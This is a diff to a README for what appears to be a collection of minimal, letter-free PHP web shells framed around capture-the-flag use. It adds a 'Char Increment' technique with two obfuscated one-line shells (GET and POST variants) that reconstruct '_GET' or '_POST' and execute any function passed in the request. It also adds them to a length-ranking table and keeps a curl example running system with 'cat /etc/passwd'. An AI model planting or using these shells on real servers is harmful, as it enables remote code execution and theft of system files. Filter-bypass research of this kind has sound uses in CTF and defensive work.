@@ -77,6 +77,7 @@ So i started to investigate how this could be avoided, and found the following M
 2. Infinite result into string `9**999` => `INF`
 3. Underscore constant `_` => `_`
 4. Long numbers `9**99` => `2.9512665430653E+94`
+5. Char Increment `'A'++` => `B`
 
 Based on the found approaches I tried around which method would be the best fitting.
 I found out that version 4) would be hard to Exploit due to the nature of the long string.
@@ -85,6 +86,7 @@ And the base from `E+` xor into anything would be to long. So I dumped this idea
 * Array into String
 * Infinite result into string
 * Underscore constant
+* Char Increment
 
 The speciality of the `Underscore constant` is that this will only work on pre php8 
 versions since the use of underscore as constant was then removed.
@@ -118,6 +120,16 @@ versions since the use of underscore as constant was then removed.
 <?=$_=[]._;$_=_.($_[3].$_[4].$_[3].$_[3]^1625.._);$$_[0]($$_[1]);
 ```
 ---
+## Char Increment
+**GET**
+```php
+<?=[$_=([]..1)[0],++$_,++$_,$__=$_++,++$_,++$_,++$_,$__.=++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,$_=$__.++$_,$__=$_(95).$_(71).$_(69).$_(84),$$__[0]($$__[1])];
+```
+**POST**
+```php
+<?=[$_=([]..1)[0],++$_,++$_,$__=$_++,++$_,++$_,++$_,$__.=++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,$_=$__.++$_,$__=$_(95).$_(80).$_(79).$_(83).$_(84),$$__[0]($$__[1])];
+```
+---
 
 ## Length Ranking
 
@@ -129,8 +141,10 @@ versions since the use of underscore as constant was then removed.
 | 4    | Underscore constant         | POST   | 65     |
 | 5    | Array into String           | POST   | 68     |
 | 6    | Infinite result into string | POST   | 78     |
+| 7    | Char Increment              | GET    | 169    |
+| 8    | Char Increment              | POST   | 176    |
 
-To query the shells you can use the browser or this snippents:
+To query the shells you can use the browser or this snippets:
 
 ```bash
 curl https://host.ctf.com/shell.php?0=system&1=cat /etc/passwd
@@ -171,7 +185,7 @@ This will allow calling of a function with unlimited parameters and print the re
 ## Contribute
 If you find any other option to generate a string with chars in the range to generate `_GET` or `_POST`
 I would be happy to include them in the ranking and if possible to optimize them. 
-The only restriction is that it needs to be less than `100 chars`
+The only restriction is that it needs to be less than `200 chars`
 
 Cli-Ish over and out.
 
